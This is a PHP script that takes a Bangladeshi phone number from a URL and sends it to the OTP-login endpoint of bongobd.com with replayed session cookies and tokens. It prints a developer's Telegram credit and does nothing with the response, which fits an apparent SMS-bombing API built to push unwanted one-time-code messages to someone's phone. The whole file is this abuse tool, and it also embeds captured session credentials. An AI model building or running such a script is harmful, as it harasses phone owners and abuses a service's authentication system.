<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Get the phone number parameter from the URL
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';

// Remove any non-digit characters from the phone number
$phone = preg_replace('/\D/', '', $phone);

// Check if the phone number is 11 digits
if (strlen($phone) !== 11) {
    die('Invalid phone number. It must be an 11-digit number.');
}

// Define the API URL
$url = 'https://accounts.bongobd.com/realms/bongo/login-actions/authenticate?session_code=fKoCo1Feev3YBPRnbXU7AQ97LV14e4wTUJ_nzv7Z41Q&execution=a8d40102-6986-4bd9-a122-99b1ea13f670&client_id=otplogin&tab_id=uYwhnrRAwR4';

// Prepare the data
$data = http_build_query([
    'country' => '+880',
    'phoneNumberPart' => $phone,
    'phone_number' => '+880' . $phone
]);

// Initialize cURL session
$ch = curl_init();

// Set the cURL options
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language: en-US,en;q=0.9,bn;q=0.8',
    'Cache-Control: max-age=0',
    'Content-Type: application/x-www-form-urlencoded',
    'Cookie: AUTH_SESSION_ID=ae03f327-b4e5-4278-bc8a-ebe8e9fc3b08.keycloak-f7f656479-jf75t-50578; AUTH_SESSION_ID_LEGACY=ae03f327-b4e5-4278-bc8a-ebe8e9fc3b08.keycloak-f7f656479-jf75t-50578; KC_RESTART=eyJhbGciOiJIUzUxMiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI0NWRiZTZmZS1kZjJiLTQzNTktYWE4ZS1lODEyNjJmNmY1ZTIifQ.eyJjaWQiOiJvdHBsb2dpbiIsInB0eSI6Im9wZW5pZC1jb25uZWN0IiwicnVyaSI6Imh0dHBzOi8vYm9uZ29iZC5jb20vcmVnaXN0ZXI_cmVzdW1lVXJsPUx3PT0iLCJhY3QiOiJBVVRIRU5USUNBVEUiLCJub3RlcyI6eyJjbGllbnRfcmVxdWVzdF9wYXJhbV9jb3VudHJ5X2NvZGUiOiJCRCIsInNjb3BlIjoib3BlbmlkIiwiaXNzIjoiaHR0cHM6Ly9hY2NvdW50cy5ib25nb2JkLmNvbS9yZWFsbXMvYm9uZ28iLCJyZXNwb25zZV90eXBlIjoiY29kZSIsImNsaWVudF9yZXF1ZXN0X3BhcmFtX2tjX2xvY2FsZSI6ImVuIiwic3RhdGUiOiIxOTYyMGNlNS00ZWMxLTQ1OTItODFmNy03N2RhZjNhZTcyNjUiLCJjb2RlX2NoYWxsZW5nZV9tZXRob2QiOiJTMjU2IiwicmVkaXJlY3RfdXJpIjoiaHR0cHM6Ly9ib25nb2JkLmNvbS9yZWdpc3Rlcj9yZXN1bWVVcmw9THc9PSIsIm5vbmNlIjoiNTE4ODU2MGEtMzdlNy00NTI5LTkyMTUtYjM3ZGZlOTVjYWU4IiwiY29kZV9jaGFsbGVuZ2UiOiJVNWpLcWFFYXhVTVM4RE5qdmxtM1JpRV9BNzd3RDdIMVp1ZThBSUtuRDdFIiwicmVzcG9uc2VfbW9kZSI6InF1ZXJ5IiwiY2xpZW50X3JlcXVlc3RfcGFyYW1fYW5vbnltb3VzX2lkIjoiMDFiZGJkNWYtZjI4Zi00ZWM2LWJmYWMtOWMyMGFkMzVlOWM4In19.NPtN25CLx7rkE60tOQ_ocM7jdI9UK7xFXTKvFItfwNGaIcZ9BNoHe8qeJRMrfZgGfWNd5CaHIhUWxe-EBfQ07Q; bongo-user-uuid=01bdbd5f-f28f-4ec6-bfac-9c20ad35e9c8; bongo-device-uuid=add89415-e298-4e00-bda4-a9afa888dd0c; anonymousId=01bdbd5f-f28f-4ec6-bfac-9c20ad35e9c8; KEYCLOAK_LOCALE=en; AWSALB=wtanLW9FCIhxH3V1vD9NXgjik8X0P0w5qMqnH1j8u2bnXUxsztZWCtcOPyykWwqDbK9mW9H0pNa9x6963HLY7ge4JG+W4hqzL+FQwTaA+aSwHzSwEJzEHXa2A99S; AWSALBCORS=wtanLW9FCIhxH3V1vD9NXgjik8X0P0w5qMqnH1j8u2bnXUxsztZWCtcOPyykWwqDbK9mW9H0pNa9x6963HLY7ge4JG+W4hqzL+FQwTaA+aSwHzSwEJzEHXa2A99S',
    'Origin: null',
    'Priority: u=0, i',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'Upgrade-Insecure-Requests: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
]);

curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

// Execute the request
$response = curl_exec($ch);

// Check for errors
if ($response === false) {
    echo 'Curl error: ' . curl_error($ch);
} else {
    // Output success response
    echo "Api Owner : @hasandeveloper00<br>";
    echo "Telegram : t.me/cyber24_bd";
}

// Close the cURL session
curl_close($ch);
?>
